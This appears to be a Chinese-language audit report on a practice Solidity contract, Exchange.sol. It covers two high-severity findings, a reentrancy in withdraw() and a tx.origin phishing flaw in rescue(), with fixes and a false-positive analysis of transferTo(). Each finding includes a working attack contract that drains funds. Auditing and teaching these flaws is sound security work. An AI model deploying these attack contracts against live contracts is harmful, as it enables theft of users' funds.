# Exchange 审计报告

| 项目 | 内容 |
|---|---|
| **目标合约** | [`targets/Exchange.sol`](../targets/Exchange.sol) |
| **审计日期** | 2026-10 |
| **审计方式** | 手动代码审计 + 攻击合约验证（PoC） |
| **漏洞总数** | **2**（高危 2） |
| **已排除的误报** | 1（`transferTo()`） |

---

## 摘要

| ID | 标题 | 严重性 | 位置 | 类型 |
|---|---|---|---|---|
| [EX-01](#ex-01-先转账后扣账导致重入) | 先转账、后扣账导致重入 | 🔴 **High** | `withdraw()` L40 → L43 | 重入 |
| [EX-02](#ex-02-使用-txorigin-判断身份遭钓鱼) | 使用 `tx.origin` 判断身份，遭钓鱼 | 🔴 **High** | `rescue()` L48 | 访问控制 |
| [FP-01](#fp-01-transferto-看起来像重入但完全干净) | **误报排除**：`transferTo()` 看起来像重入，实际干净 | ✅ — | `transferTo()` L32-33 | — |

## 函数概览

| 函数 | 判定 |
|---|---|
| `deposit()` | ✅ 干净 |
| `transferTo()` | ✅ 干净（**误报陷阱**） |
| `withdraw()` | 🔴 重入 |
| `rescue()` | 🔴 `tx.origin` 钓鱼 |

---

## EX-01 先转账、后扣账导致重入

**位置** `withdraw()`，L40 → L43
**严重性** 🔴 High
**类型** Reentrancy

### 描述

```solidity
function withdraw(uint amount) public {
    require(amount <= balances[msg.sender], "not enough");   // L38

    (bool ok, ) = msg.sender.call{value: amount}("");        // L40  转账
    require(ok, "failed");                                   // L41

    balances[msg.sender] = balances[msg.sender] - amount;    // L43  改账
}
```

**转账行 L40 在改账行 L43 上面** —— 判定的唯一依据。

### 攻击路径

```solidity
contract ExchangeAttacker {
    Exchange public target;
    constructor(address _target) { target = Exchange(_target); }

    function attack() public payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }

    function collect() public { payable(msg.sender).transfer(address(this).balance); }
}
```

递归过程中 `balances[attacker]` 始终是原值，直到合约资金耗尽。

### 影响

**合约全部资金被提取，账本数字停留在旧值 → 坏账。**

### 修复

```solidity
function withdraw(uint amount) public {
    require(amount <= balances[msg.sender], "not enough");

    balances[msg.sender] = balances[msg.sender] - amount;    // CEI：先扣账
    (bool ok, ) = msg.sender.call{value: amount}("");        // 再转账
    require(ok, "failed");
}
```

---

## EX-02 使用 `tx.origin` 判断身份遭钓鱼

**位置** `rescue()`，L48
**严重性** 🔴 High
**类型** Access Control / Phishing

### 描述

```solidity
function rescue(address to) public {
    if (tx.origin == owner) {                                   // L48
        payable(to).transfer(address(this).balance);            // L49
    }
}
```

两个问题叠加：

1. **`tx.origin` 可被钓鱼绕过**（见下文）
2. **`address(this).balance` 是合约全部资金**，且函数名为 `rescue`（救援）—— 实际是「owner 可卷走全部用户资金」的中心化风险

### 攻击路径

```solidity
contract ExchangePhisher {
    Exchange public target;
    address public hacker;

    constructor(address _target) {
        target = Exchange(_target);
        hacker = msg.sender;
    }

    function claimReward() public {
        // 包装成「领取奖励」，诱导 owner 点击
        // to 参数直接指定为攻击者地址
        target.rescue(hacker);
    }
}
```

调用链：`owner` → `ExchangePhisher` → `Exchange`

| 变量 | 值 | 检查结果 |
|---|---|---|
| `tx.origin` | owner | ✅ 通过 |
| `msg.sender` | ExchangePhisher | 无人检查 |
| `to` | hacker | 无人检查 |

**owner 点一次，合约全部余额转入攻击者地址。**

### 影响

**资金全部损失。** 这是本仓库四个靶场里危害最直接的一条 —— 不需要任何前置条件，一次点击即可。

### 修复

```solidity
function rescue(address to) public {
    require(msg.sender == owner, "not owner");
    require(to != address(0), "invalid recipient");
    payable(to).transfer(address(this).balance);
}
```

> **注意**：即使修好了 `tx.origin`，`rescue()` 依然允许 owner 提取**用户的钱**。这在设计上属于**中心化风险**，如果产品承诺「用户资金不可被提取」，就需要把 `rescue()` 的目标限制为手续费池（参见 [`contracts/Bank.sol`](../contracts/Bank.sol) 的 `fees` 设计）。

---

## FP-01 `transferTo()` 看起来像重入，但完全干净

**位置** `transferTo()`，L30-33
**判定** ✅ **不是漏洞（误报）**
**类型** False Positive

### 为什么它看起来可疑

```solidity
function transferTo(address to, uint amount) public {
    require(amount <= balances[msg.sender], "not enough");   // L30

    balances[to] = balances[to] + amount;                   // L32  改「to」的账
    balances[msg.sender] = balances[msg.sender] - amount;   // L33  改「自己」的账
}
```

**一个函数同时改两个人的账本** —— 这在很多真实漏洞里确实是危险信号（账本之间失去同步、可以给自己转账套利等）。

### 为什么它实际上干净

**重入的前提是「真的转了钱」。**

判断方法只有一条 —— **搜这个函数里有没有外部调用**：

| 关键词 | 本函数里有吗 |
|---|---|
| `.call{value:` | ❌ |
| `.transfer(` | ❌ |
| `.send(` | ❌ |

**三个都没有 → 这个函数一分钱都没有真的转出去，只是在账本上挪了两个数字 → 不可能重入。**

### 进一步核对

| 检查项 | 结果 |
|---|---|
| 谁能调用 | 任何人 —— 但**只动自己那一页账本的钱**，正常 |
| 有没有外部调用 | ❌ 没有 → 不可能重入 |
| 检查的是什么 | L30 查「金额」—— 这里查金额就够了，因为动的是自己的钱 |
| 有没有 `tx.origin` | ❌ |
| 有没有随机数 | ❌ |

**结论：干净。**

### 影响

**把 `transferTo()` 报成漏洞，就是一次误报。**

在真实的漏洞赏金项目里，**误报的代价比漏报更高**：

- Immunefi 等平台有**信誉分机制**，报一堆 invalid 会掉分，**严重时被限制提交**
- 项目方 triage 是人做的，模板化、没有 PoC 的报告会被直接关闭
- **新人死在「挖不到洞」上的很少，死在「报假洞」上的很多**

### 误报的两个典型来源

本次审计中，`transferTo()` 属于第一类：

1. **看到 `require` 就以为「这里有人管着」** —— 要看它查的是人、钱、还是状态
2. **看到「改了多份状态」或 `.call{value:` 就以为「一定是重入」** —— 要确认是否**真的发生了外部调用**，以及**转账行是否在改账行之前**

> **认出「有没有 `.call{value:`」这一件事只要三秒。**
> **在它身上花的每一分怀疑，都是因为你在「认脸」，不是在「读代码」。**

---

## 结论

`Exchange` 一共 **2 个高危漏洞 + 1 个已排除的误报**。

| ID | 判定 | 修法 |
|---|---|---|
| EX-01 | 🔴 重入 | 把 L43 挪到 L40 之前（CEI） |
| EX-02 | 🔴 `tx.origin` 钓鱼 + 中心化风险 | `tx.origin` → `msg.sender`；并限制提取范围 |
| FP-01 | ✅ 干净 | 无需修改 |

**这份报告最有价值的部分不是两个漏洞，是 FP-01。**

> **一份只报告真问题的审计报告，比一份「什么都说有问题」的报告值钱得多。**
> **区分「看起来危险」和「实际危险」，才是审计能力的真正体现。**
